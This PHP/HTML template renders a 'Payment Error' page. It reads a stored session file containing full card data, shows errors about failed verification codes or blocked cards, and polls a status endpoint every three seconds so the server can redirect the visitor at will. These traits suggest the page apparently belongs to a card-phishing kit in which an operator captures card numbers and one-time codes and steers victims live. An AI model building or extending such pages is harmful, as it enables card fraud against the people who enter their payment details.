<?php
require_once 'config.php';

// Get session ID and error from URL
$sessionId = $_GET['session'] ?? '';
$errorType = $_GET['error'] ?? '';

if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    die('Invalid session ID');
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    die('Session not found');
}

// Read session data
$sessionData = json_decode(file_get_contents($sessionFile), true);

// Determine error message
$errorMessages = [
    'invalid_code' => 'The verification code you entered is incorrect. Please try again.',
    'timeout' => 'The verification process has timed out. Please try again.',
    'system_error' => 'A system error occurred. Please contact support.',
    'card_blocked' => 'This card has been blocked. Please use another payment method.'
];

$errorMessage = $errorMessages[$errorType] ?? 'An unexpected error occurred. Please try again.';

$pageTitle = 'Payment Error';
$checkStatusUrl = buildPageUrl('check_status');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error Processing Payment</title>
    <style>
        :root {
            --error: #e25950;
            --text: #32325d;
            --text-light: #6b7c93;
            --bg: #f8f9fa;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-font-smoothing: antialiased;
        }
        
        .error-container {
            max-width: 500px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        
        .error-icon {
            font-size: 80px;
            color: var(--error);
            margin-bottom: 20px;
        }
        
        .error-title {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 15px;
            color: var(--error);
        }
        
        .error-message {
            font-size: 16px;
            color: var(--text-light);
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .card-preview {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border: 1px solid #dee2e6;
        }
        
        .card-number {
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 2px;
            margin-bottom: 15px;
            color: var(--text);
        }
        
        .action-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 20px;
        }
        
        .btn {
            padding: 12px 24px;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.15s ease;
        }
        
        .btn-primary {
            background: var(--error);
            color: white;
        }
        
        .btn-primary:hover {
            background: #c53030;
        }
        
        .btn-secondary {
            background: #6c757d;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #545b62;
        }
        
        .support-info {
            margin-top: 30px;
            padding: 15px;
            background: rgba(226, 89, 80, 0.1);
            border-radius: 8px;
            font-size: 14px;
        }
        
        @media (max-width: 480px) {
            .error-container {
                padding: 15px;
            }
            
            .error-icon {
                font-size: 60px;
            }
            
            .error-title {
                font-size: 24px;
            }
            
            .action-buttons {
                flex-direction: column;
            }
        }

        body {
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-icon">❌</div>
        <h1 class="error-title">Payment Error</h1>
        <p class="error-message"><?= $errorMessage ?></p>
        
        <div class="card-preview">
            <div class="card-number">
                **** **** **** <?= substr($sessionData['card_data']['number'], -4) ?>
            </div>
        </div>
        
        <div class="action-buttons">
            <a href="<?= htmlspecialchars(buildPageUrl('payments')) ?>" class="btn btn-primary">Try Again</a>
            <a href="<?= htmlspecialchars(buildPageUrl('index')) ?>" class="btn btn-secondary">Return Home</a>
        </div>
        
        <div class="support-info">
            <strong>Need help?</strong> Contact our support team if you continue to experience issues.
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;

            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };

            poll();
            setInterval(poll, 3000);

            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>